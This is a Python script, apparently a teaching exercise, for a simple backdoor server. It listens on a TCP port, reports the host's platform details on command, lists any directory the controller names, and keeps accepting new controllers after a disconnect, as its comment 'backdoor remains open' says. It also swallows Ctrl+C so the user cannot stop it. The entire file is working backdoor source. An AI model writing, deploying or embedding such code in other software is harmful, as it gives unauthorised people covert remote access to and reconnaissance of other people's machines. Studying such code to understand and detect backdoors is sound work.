
import socket, platform, os

SRV_ADDR = "127.0.0.1"
SRV_PORT = 33333

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# set to SO_REUSEADDR before binding
# this says to re-use the port when the port is busy BUT in a TIME_WAIT state
# If it is busy in other state, you get an address already in use error

s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((SRV_ADDR, SRV_PORT))
s.listen(1)
connection, address = s.accept()

while 1:
    try:
        data = connection.recv(1024)

    # except:continue stops user from quitting script with ctrl+C in the terminal
    # because ctrl+C raises a KeyboardInterrupt exception 
    except:continue
    
    # system information
    if(data.decode('utf-8') == '1'):
        tosend = platform.platform() + " " + platform.machine()
        connection.sendall(tosend.encode())

    # file list
    elif(data.decode('utf-8') == '2'):
        data = connection.recv(1024)
        try:
            filelist = os.listdir(data.decode('utf-8'))
            tosend = ""
            for x in filelist:
                tosend += "," + x
        except:
            tosend = "Wrong path"
        connection.sendall(tosend.encode())
    
    # client disconnects
    elif(data.decode('utf-8') == '0'):
        connection.close()
        # backdoor remains open
        connection, address = s.accept()